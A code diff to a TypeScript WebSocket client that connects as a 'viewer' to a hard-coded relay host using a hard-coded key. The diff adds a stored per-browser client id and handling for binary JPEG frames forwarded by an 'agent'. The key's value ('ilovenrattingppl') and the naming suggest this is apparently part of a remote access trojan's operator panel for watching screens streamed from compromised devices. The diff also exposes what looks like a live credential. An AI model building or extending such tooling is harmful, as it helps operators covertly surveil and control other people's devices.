@@ -4,12 +4,30 @@
 const RELAY_WS_URL = "wss://veltrix.hidenfree.com";
 const RELAY_AUTH_KEY = "ilovenrattingppl"; // must match HIDEN_AUTH_KEY on the relay
 
+// Stable per-browser id so the relay can keep exactly one socket per client.
+// If the same tab reconnects (HMR, network blip), the relay drops the old one.
+function getClientId(): string {
+  if (typeof window === "undefined") return "ssr";
+  try {
+    let id = localStorage.getItem("hh_client_id");
+    if (!id) {
+      id = (crypto.randomUUID?.() ?? `${Date.now()}-${Math.random().toString(36).slice(2)}`);
+      localStorage.setItem("hh_client_id", id);
+    }
+    return id;
+  } catch {
+    return `${Date.now()}-${Math.random().toString(36).slice(2)}`;
+  }
+}
+
 export type RelayMessage = {
   type: string;
   payload?: any;
   from?: string;
   viewerId?: string;
   deviceId?: string;
+  /** Present when the agent forwarded a raw binary frame (e.g. JPEG bytes). */
+  binary?: ArrayBuffer;
   [k: string]: any;
 };
 
@@ -47,8 +65,13 @@ export class RelaySocket {
   private _tryConnect() {
     if (!this.alive) return;
     try {
-      const url = `${RELAY_WS_URL}/?key=${encodeURIComponent(RELAY_AUTH_KEY)}&role=viewer&device=${encodeURIComponent(this.deviceId)}`;
+      const clientId = getClientId();
+      const url =
+        `${RELAY_WS_URL}/?key=${encodeURIComponent(RELAY_AUTH_KEY)}` +
+        `&role=viewer&device=${encodeURIComponent(this.deviceId)}` +
+        `&clientId=${encodeURIComponent(clientId)}`;
       this.ws = new WebSocket(url);
+      this.ws.binaryType = "arraybuffer";
 
       this.ws.onopen = () => {
         if (!this.alive) {
@@ -58,10 +81,15 @@ export class RelaySocket {
         this._connected = true;
         this._emit({ type: "_connected" });
         // Send hello handshake
-        this._send({ type: "hello", role: "viewer", deviceId: this.deviceId });
+        this._send({ type: "hello", role: "viewer", deviceId: this.deviceId, clientId });
       };
 
       this.ws.onmessage = (ev) => {
+        // Binary fast-path: the relay forwards agent binary frames untouched.
+        if (ev.data instanceof ArrayBuffer) {
+          this._emit({ type: "frame", from: "agent", binary: ev.data });
+          return;
+        }
         try {
           const msg: RelayMessage = JSON.parse(ev.data);
           this._emit(msg);
